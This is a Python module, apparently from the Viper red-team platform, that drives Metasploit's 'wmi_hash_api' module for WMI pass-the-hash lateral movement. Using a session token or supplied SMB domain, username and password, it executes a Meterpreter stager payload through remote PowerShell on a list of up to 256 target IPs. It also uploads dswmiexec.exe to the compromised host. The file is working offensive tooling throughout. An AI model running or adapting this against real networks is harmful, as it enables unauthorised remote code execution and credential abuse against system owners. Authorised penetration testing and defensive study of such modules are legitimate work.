# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "WMI哈希传递"
    DESC_ZH = "使用Session的Token或已知的用户名及密码,通过wmi方式在目标主机执行载荷.\n" \
              "模块将dswmiexec.exe上传到当前主机,通过dswmiexec.exe调用对方主机的powershell.exe,AV主动防御可能会提示风险.\n" \
              "(如模块提示powershell命令超长,请使用stager类型监听)\n" \
              "(模块无需内网路由)"

    NAME_EN = "WMI PTH"
    DESC_EN = "Use Session Token or a username and password to execute the payload on the target host through wmi.\n" \
              "The module uploads dswmiexec.exe to the current host, and calls the other host's powershell.exe through dswmiexec.exe, AV active defense may prompt risks.\n" \
              "(If the module prompts that the powershell command is too long, please use the stager type to handler)\n" \
              "Module do not need msfroute"

    MODULETYPE = TAG2TYPE.Lateral_Movement
    AUTHOR = ["Viper"]  # 作者
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1097"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/kgotml"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1097/"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionIPAddressRange(name='address_range',
                             tag_zh="IP列表",
                             desc_zh="IP列表(支持1.1.1.1,2.2.2.2,3.3.3.3-3.3.3.10格式输入)",
                             tag_en="IP list",
                             desc_en="IP list (support 1.1.1.1, 2.2.2.2, 3.3.3.3-3.3.3.10 format input)",
                             required=True),
        OptionStr(name='SMBDomain',
                  tag_zh="域", desc_zh="目标主机的域信息 . 表示本地域",
                  tag_en="Domain", desc_en="Domain information of the target host", ),
        OptionStr(name='SMBUser',
                  tag_zh="用户名", desc_zh="smb用户名",
                  tag_en="User", desc_en="smb username", ),
        OptionStr(name='SMBPass',
                  tag_zh="密码", desc_zh="smb密码(不是hash)",
                  tag_en="Password", desc_en="smb password (not hash)", ),
        OptionCredentialEnum(required=False, password_type=['windows', ]),
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/wmi_hash_api"
        self.runasjob = True

    def check(self):
        """执行前的检查函数"""
        # 设置RHOSTS参数
        address_range = self.param_address_range('address_range')
        if len(address_range) > 256:
            return False, "扫描IP范围过大(超过256)", "Scanning IP range is too large (more than 256)"
        elif len(address_range) < 0:
            self.set_msf_option(key='RHOSTS', value=self.host_ipaddress)
        self.set_msf_option('RHOSTS', ", ".join(address_range))

        payload = self.get_handler_payload()
        if "meterpreter_reverse" in payload or "meterpreter_bind" in payload:
            return False, "请选择Stager类型的监听(例如/meterpreter/reverse_tcp或/meterpreter/bind_tcp)", "Please select the stager type of handler (e.g. /meterpreter/reverse_tcp or /meterpreter/bind_tcp)"
        flag = self.set_payload_by_handler()
        if flag is not True:
            return False, "无法解析Handler,请选择正确的监听", "Unable to resolve Handler, please select the correct handler"

        flag = self.set_smb_info_by_credential()
        if flag is not True:
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and user is not None and password is not None:
                self.set_msf_option(key='SMBDomain', value=domain)
                self.set_msf_option(key='SMBUser', value=user)
                self.set_msf_option(key='SMBPass', value=password)
                return True, None

        else:
            # 手工输入覆盖凭证输入
            domain = self.param('SMBDomain')
            user = self.param('SMBUser')
            password = self.param('SMBPass')
            if domain is not None and domain != "":
                self.set_msf_option(key='SMBDomain', value=domain)
            if user is not None and user != "":
                self.set_msf_option(key='SMBUser', value=user)
            if password is not None and password != "":
                self.set_msf_option(key='SMBPass', value=password)
            return True, None
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            for one in data:
                self.log_info(f"IP: {one.get('server')}  结果: {one.get('flag')}",
                              f"IP: {one.get('server')} Result: {one.get('flag')}")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
